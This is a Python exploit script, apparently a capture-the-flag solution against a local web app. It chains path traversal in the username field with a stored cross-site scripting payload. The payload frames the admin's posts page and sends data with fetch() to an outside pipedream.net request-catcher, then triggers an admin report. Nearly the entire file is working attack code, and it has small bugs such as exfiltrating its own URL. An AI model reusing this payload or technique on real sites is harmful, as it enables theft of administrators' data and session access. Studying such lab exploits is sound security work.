import requests
from datetime import datetime,timedelta
import re

BASE_URL = "http://172.17.0.2:1337"
PAYLOAD = """
<iframe id="website" src="http://127.0.0.1:1337/posts/view/admin" width="100%" height="100%"></iframe>

<script>
    website = document.getElementById("website");

    website.onload = function() {
        console.log(website.contentWindow.document.body.innerHTML);
        fetch("https://enkpfw7a69sir.x.pipedream.net/"+btoa("https://enkpfw7a69sir.x.pipedream.net/"))
    }

</script>

"""

def find_date():
    resp = requests.get(BASE_URL )
    print(resp.text)
    if len(re.findall(r"(\d{4}-\d{2}-\d{2}) \d{2}:\d{2}:\d{2}", resp.text))>0:
        current_date=re.search(r"(\d{4}-\d{2}-\d{2}) \d{2}:\d{2}:\d{2}", resp.text).group()
        print("[+] Current date",current_date)
        return datetime.strptime(current_date, "%Y-%m-%d %H:%M:%S")
    else: 
        exit(1)


s = requests.Session()
current_time=find_date()

resp=""
for i in range(10):
    creds = {"username": f"..\\..\\..\\static\\logs\\{current_time}", "password": "pw"}
    resp = s.post(BASE_URL + "/api/register", json=creds)

    print(resp.text)
    assert resp.status_code == 200

    resp = s.post(BASE_URL + "/api/login", json=creds)


    resp = s.post(
        BASE_URL + "/api/posts",
        json={"content": PAYLOAD, "hidden": False},
    )
    print(resp.text)

    resp= s.get(BASE_URL+"/")
    print(resp.text)

    current_time=current_time+timedelta(seconds=1)
    resp=s.get(BASE_URL+"/static/logs/"+current_time)

    print(resp.text)
    if PAYLOAD in resp.text:
        break


    resp = s.post(
        BASE_URL + "/api/report?username=" + creds["username"],
        json={"username": creds["username"]},
    )

    print(resp.text)
